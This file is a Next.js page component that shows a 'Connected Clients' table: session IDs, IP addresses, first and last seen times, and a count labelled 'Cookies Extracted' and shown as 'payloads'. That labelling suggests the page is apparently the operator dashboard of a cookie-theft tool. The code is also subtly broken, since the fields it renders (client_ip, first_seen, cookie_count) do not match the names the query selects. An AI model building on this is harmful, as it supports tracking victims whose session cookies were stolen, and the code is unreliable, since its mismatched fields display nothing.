
import { Users, Fingerprint } from "lucide-react";
import { desc, eq, sql } from "drizzle-orm";
import { clients, clientCookies } from "@/lib/schema/main.schema";
import { mainDb } from "@/lib/db";
import { requireSession } from "@/lib/auth";


export const dynamic = "force-dynamic";

export default async function ClientsPage() {
  await requireSession();
  // const clients = mainDb.db.prepare(`
  //   SELECT c.*, 
  //          (SELECT COUNT(*) FROM client_cookies cc WHERE cc.sessionId = c.sessionId) as cookie_count
  //   FROM clients c 
  //   ORDER BY c.last_seen DESC
  // `).all();
  const clientDetails = await mainDb
    .select({
      sessionId: clients.sessionId,
      clientIp: clients.client_ip,
      firstSeen: clients.first_seen,
      lastSeen: clients.last_seen,

      cookieCount: sql<number>`
        (
          SELECT COUNT(*)
          FROM ${clientCookies}
          WHERE ${clientCookies.sessionId} = ${clients.sessionId}
        )
      `.as("cookie_count"),
    })
    .from(clients)
    .orderBy(desc(clients.last_seen));

  return (
    <div className="flex-1 overflow-y-auto p-8">
      <div className="max-w-7xl mx-auto space-y-6">
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-3xl font-bold tracking-tight text-white flex items-center gap-3">
              <Users className="w-8 h-8 text-blue-500" />
              Connected Clients
            </h1>
            <p className="text-gray-400 mt-2">View and manage all connected sessions and their associated footprints.</p>
          </div>
          <div className="bg-[#111111] px-4 py-2 border border-[#222] rounded-lg">
            <span className="text-gray-400 text-sm">Total:</span>
            <span className="text-white ml-2 font-semibold">{clientDetails.length}</span>
          </div>
        </div>

        <div className="bg-[#111111] border border-[#222] rounded-2xl overflow-hidden shadow-sm">
          <div className="overflow-x-auto">
            <table className="min-w-full divide-y divide-[#222]">
              <thead className="bg-[#161616]">
                <tr>
                  <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Session ID</th>
                  <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">IP Address</th>
                  <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Cookies Extracted</th>
                  <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">First Seen</th>
                  <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Last Seen</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-[#222]">
                {clientDetails.map((client: any) => (
                  <tr key={client.sessionId} className="hover:bg-[#161616] transition-colors">
                    <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-300 font-mono">
                      <div className="flex items-center gap-2">
                        <Fingerprint className="w-4 h-4 text-gray-500" />
                        {client.sessionId}
                      </div>
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-300">
                      <span className="bg-gray-800 px-2 py-1 rounded text-xs">{client.client_ip}</span>
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-300">
                      {client.cookie_count > 0 ? (
                        <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-emerald-500/10 text-emerald-400">
                          {client.cookie_count} payloads
                        </span>
                      ) : (
                        <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-gray-800 text-gray-400">
                          None
                        </span>
                      )}
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-400">
                      {new Date(client.first_seen).toLocaleString()}
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-400">
                      {new Date(client.last_seen).toLocaleString()}
                    </td>
                  </tr>
                ))}
                {clientDetails.length === 0 && (
                  <tr>
                    <td colSpan={5} className="px-6 py-12 text-center text-gray-500 text-sm">
                      <Fingerprint className="w-8 h-8 text-gray-700 mx-auto mb-3" />
                      No clients have connected yet.
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
}
